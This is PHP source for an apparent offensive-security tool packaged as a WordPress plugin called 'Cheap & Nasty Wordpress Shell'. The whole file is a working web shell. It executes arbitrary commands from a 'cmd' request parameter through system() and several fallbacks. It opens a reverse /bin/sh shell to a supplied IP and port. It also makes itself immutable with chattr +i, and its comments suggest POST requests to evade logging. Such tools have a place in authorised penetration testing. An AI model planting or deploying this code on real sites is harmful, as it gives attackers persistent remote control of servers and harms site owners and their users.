<?php

/*
    Plugin Name: Cheap & Nasty Wordpress Shell
    Plugin URI: https://github.com/leonjza/wordpress-shell
    Description: Execute Commands as the webserver you are serving wordpress with! Shell will probably live at /wp-content/plugins/shell/shell.php. Commands can be given using the 'cmd' GET parameter. Eg: "http://192.168.0.1/wp-content/plugins/shell/shell.php?cmd=id", should provide you with output such as <code>uid=33(www-data) gid=verd33(www-data) groups=33(www-data)</code>
    Author: Leon Jacobs
    Version: 0.3
    Author URI: https://leonjza.github.io
*/

// attempt to protect myself from deletion.
$this_file = __FILE__;
@system("chmod ugo-w $this_file");
@system("chattr +i   $this_file");

// name of the parameter (GET or POST) for the command.
// change   this  if  the  target   already   use  this
// parameter.
$cmd = 'cmd';

// name  of the  parameter  (GET or  POST)  for the  ip
// address. change this if  the target already use this
// parameter.
$ip = 'ip';

// name of the parameter (GET  or POST) for the port to
// listen  on. change  this if  the target  already use
// this parameter.
$port = 'port';

// test if  parameter 'cmd', 'ip or  'port' is present.
// if not  this will avoid an  error on logs or  on all
// pages if badly configured.

if (isset($_REQUEST[$cmd])) {
   // grab the  command we want  to run from  the 'cmd'
   // get  or post  parameter (post  don't display  the
   // command on apache logs)
   $command = $_REQUEST[$cmd];

   // notify on execution failure
   if (!executeCommand($command)) {
      echo 'The command failed to run';
   }

   // warn about noisy get commands
   if ($_SERVER['REQUEST_METHOD'] == 'GET') {
      echo 'GET requests can get logged, better use POST instead';
   }

   die();
}

if (isset($_REQUEST[$ip]) && !isset($_REQUEST[$cmd])) {
   $ip = $_REQUEST[$ip];

   // default port 443
   $port = isset($_REQUEST[$port])
      ? $_REQUEST[$port]
      : '443';

   // nc -nlvp $port
   $sock    = fsockopen($ip, $port);
   $command = '/bin/sh -i <&3 >&3 2>&3';

   // notify on execution failure
   if (!executeCommand($command)) {
      echo 'The command failed to run';
   }
}

die();

/**
 * try to execute a command using various techniques
 *
 * @param string $command command to run
 * @return bool whether one of the techniques was used to run the command
 */
function executeCommand(string $command)
{
   // try  to  find a  way  to  run our  command  using
   // various php internals.

   if (class_exists('ReflectionFunction')) {
      // http://php.net/manual/en/class.reflectionfunction.php
      $function = new ReflectionFunction('system');
      $function->invoke($command);
      return true;
   }

   if (function_exists('call_user_func_array')) {
      // http://php.net/manual/en/function.call-user-func-array.php
      call_user_func_array('system', array($command));
      return true;
   }

   if (function_exists('call_user_func')) {
      // http://php.net/manual/en/function.call-user-func.php
      call_user_func('system', $command);
      return true;
   }

   if (function_exists('passthru')) {
      // https://www.php.net/manual/en/function.passthru.php
      ob_start();
      passthru($command, $return_var);
      ob_flush();
      return true;
   }

   if (function_exists('system')) {
      // this  is  the  last resort.  chances  are  php
      // subhosting has system() on a blacklist anyways
      // :>
      // http://php.net/manual/en/function.system.php
      system($command);
      return true;
   }

   return false;
}
